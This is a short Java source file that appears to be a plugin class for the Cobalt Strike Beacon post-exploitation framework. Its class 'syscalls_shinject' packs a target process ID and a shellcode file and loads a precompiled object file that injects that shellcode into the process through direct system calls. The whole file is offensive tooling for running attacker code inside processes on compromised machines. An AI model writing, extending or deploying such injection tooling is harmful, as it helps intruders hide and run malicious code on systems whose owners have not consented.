package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.CommonUtils;
import common.Packer;

public class syscalls_shinject extends PostExInlineObject {
	protected String Params;

	public syscalls_shinject(AggressorClient var1, String Params) {
		super(var1);
		this.Params = Params;
	}

	public byte[] getArguments(String var1) {
		Packer var2 = new Packer();
		String[] args = this.Params.split("\\s+");
		if (args.length == 2) {
			int pid = Integer.parseInt(args[0]);
			var2.addInt(pid);
			var2.addLengthAndString(CommonUtils.readFile(args[1]));
			return var2.getBytes();
		} else {
			throw new RuntimeException("syscalls_shinject Params Error");
		}
	}

	public byte[] getObjectFile(String var1) {
		return CommonUtils.readResource("bullbof/syscallsinject." + var1 + ".o");
	}
}
